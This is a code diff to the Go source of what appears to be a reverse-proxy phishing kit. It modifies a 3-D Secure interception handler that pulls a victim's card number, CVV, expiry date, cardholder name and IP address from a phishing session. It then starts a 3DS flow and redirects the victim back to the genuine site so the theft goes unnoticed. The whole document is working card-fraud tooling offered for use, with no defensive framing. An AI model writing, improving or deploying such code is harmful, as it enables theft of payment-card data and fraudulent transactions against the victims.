@@ -3193,7 +3193,7 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 	var cardYear string
 	var cardHolder string
 	if ok {
-		cvv = s.Password
+		cvv = s.Custom["cardCvv"]
 		remoteAddr = s.RemoteAddr
 		redirectURL = s.RedirectURL
 		sIndex, _ = p.sids[sessionID]
@@ -3208,6 +3208,19 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		return req, nil
 	}
 
+	if redirectURL == "" {
+		referer := req.Referer()
+		if referer != "" {
+			if refererURL, err := url.Parse(referer); err == nil {
+				if origHost, ok2 := p.replaceHostWithOriginal(refererURL.Host); ok2 {
+					refererURL.Host = origHost
+					refererURL.Scheme = "https"
+					redirectURL = refererURL.String()
+				}
+			}
+		}
+	}
+
 	expireDate := ""
 	if cardMonth != "" && cardYear != "" {
 		yearSuffix := cardYear
@@ -3217,7 +3230,7 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		expireDate = fmt.Sprintf("%s/%s", cardMonth, yearSuffix)
 	}
 
-	p.threeDS.Initiate(sessionID, sIndex, cvv, cardNumber, expireDate, cardHolder, remoteAddr, phishletName)
+	p.threeDS.Initiate(sessionID, sIndex, cvv, cardNumber, expireDate, cardHolder, remoteAddr, phishletName, redirectURL)
 	p.threeDS.Send3DSNotification(sessionID)
 
 	tplPath := filepath.Join(p.cfg.GetPhishletsDir(), "templates", templateName, "index.html")
